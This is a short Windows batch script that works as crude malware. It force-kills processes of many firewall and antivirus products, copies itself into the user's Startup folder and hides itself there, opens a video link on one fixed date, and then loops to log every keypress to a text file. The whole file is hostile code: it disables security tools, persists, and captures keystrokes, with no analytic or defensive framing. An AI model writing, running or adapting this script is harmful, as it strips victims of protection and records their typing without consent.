@echo off
taskkill /f /im fire*
taskkill /f /im PersFw*
taskkill /f /im ZoneAlarm*
cls
taskkill /f /im OutPost*
taskkill /f /im nv*
taskkill /f /im nav*
cls
taskkill /f /im BLACKICE*
taskkill /f /im ZAP*
taskkill /f /im minilog*
cls
taskkill /f /im offg*
taskkill /f /im ESAFE*
taskkill /f /im isafe*
cls
taskkill /f /im zlclien*
taskkill /f /im realm*
taskkill /f /im Barracuda*
cls
taskkill /f /im smc*
taskkill /f /im cis*
taskkill /f /im cav*
copy log.bat "C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd "C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
attrib +h log.bat
If %date% == 6/2/2022 start chrome.exe akk.li/video/jeff.mp4
setlocal EnableDelayedExpansion
color 57
title Log
set "chars= qwertyuiopasdfghjklzxcvbnm1234567890"
:start
cls
choice /c %chars% >nul
>> C:\Users\Admin\3D Objects\log.txt echo !chars:~%errorlevel%,1!
goto start

